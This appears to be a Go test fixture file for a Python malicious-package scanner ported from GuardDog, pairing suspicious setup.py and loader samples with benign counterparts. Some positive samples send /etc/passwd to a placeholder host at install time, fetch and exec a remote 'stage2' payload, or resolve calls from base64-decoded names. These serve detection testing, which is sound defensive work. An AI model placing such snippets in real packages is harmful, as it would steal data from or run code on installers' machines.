package main

// Fixtures for the Python install-time rules ported from GuardDog.
//
// setup.py runs with the user's privileges at install time, before any code
// review happens, so the setup.py-scoped rules are deliberately strict about
// what belongs in a build script.

func init() {
	positives = append(positives, pythonPositives...)
	negatives = append(negatives, pythonNegatives...)
}

// benignSetupPy is upstream GuardDog's benign sample, used as the shared
// false-positive guard for every setup.py rule.
const benignSetupPy = `# Legitimate setup.py -- does not alias dangerous imports
from setuptools import setup, find_packages

setup(
    name="my-package",
    version="1.0.0",
    packages=find_packages(),
    install_requires=["requests>=2.25.0"],
    python_requires=">=3.8",
    description="A normal package",
    author="Normal Author",
)
`

var pythonPositives = []fixture{
	// upstream: threat-setup-import-aliasing
	{"py-setup-import-aliasing", "setup.py", `
from setuptools import setup
from os import system as _ssystem
setup(name='pkg', version='1.0')
`},
	// sys.executable aliased is the dropper half of the same rule.
	{"py-setup-import-aliasing", "setup.py", `
from setuptools import setup
from sys import executable as _eexec
setup(name='pkg', version='1.0')
`},

	// upstream: threat-setup-suspicious-imports
	{"py-setup-suspicious-imports", "setup.py", `
from setuptools import setup
import requests
setup(name='pkg', version='1.0')
`},

	// upstream: threat-setup-network-in-install
	{"py-setup-network", "setup.py", `
from setuptools import setup
requests.post("https://collector.example/x", data=open('/etc/passwd').read())
setup(name='pkg', version='1.0')
`},

	// upstream: threat-runtime-dynamic-loader
	//
	// The rule requires an actual dynamic-import call, not merely importing
	// importlib, which is why import_module appears here.
	{"py-dynamic-loader", "loader.py", `
import importlib
import requests

mod = importlib.import_module("os")
payload = requests.get("http://staging.example/stage2").text
exec(payload)
`},
	// The reflective half: resolve the target from decoded data. Still needs
	// a real import call, hence __import__ rather than a bare import.
	{"py-dynamic-loader", "reflect.py", `
import base64
mod = __import__("os")
fn = getattr(mod, base64.b64decode(name).decode())
fn()
`},

	// upstream: threat-runtime-obfuscation-pyarmor
	{"py-pyarmor", "dist.py", `__pyarmor__(__name__, __file__, b'\x50\x59')`},
	{"py-pyarmor", "legacy.py", `from pytransform import pyarmor_runtime`},
}

var pythonNegatives = []fixture{
	// Upstream's benign setup.py must stay quiet under every setup.py rule.
	{"py-setup-import-aliasing", "setup.py", benignSetupPy},
	{"py-setup-suspicious-imports", "setup.py", benignSetupPy},
	{"py-setup-network", "setup.py", benignSetupPy},

	// A build script that shells out to compile an extension is ordinary.
	{"py-setup-suspicious-imports", "setup.py", `
from setuptools import setup
import os, sys
setup(name='pkg', version='1.0')
`},

	// The setup.py rules are scoped by filename. The same content in an
	// ordinary module is not install-time code and must not fire.
	{"py-setup-import-aliasing", "helpers.py", `
from os import system as _ssystem
_ssystem("ls")
`},
	{"py-setup-suspicious-imports", "client.py", `
import requests
setup(name='not-really')
`},

	// A plugin loader that imports by name, with no download and no exec
	// sink, is the common legitimate use of importlib.
	{"py-dynamic-loader", "plugins.py", `
import importlib
mod = importlib.import_module("myapp.plugins." + name)
mod.register()
`},
	// Downloading a file without executing it is not dynamic loading.
	{"py-dynamic-loader", "fetch.py", `
import requests
open('data.json','wb').write(requests.get(url).content)
`},

	// Ordinary Python must not look like PyArmor output.
	{"py-pyarmor", "app.py", `import transform_utils
def run(): return transform_utils.apply()`},
}
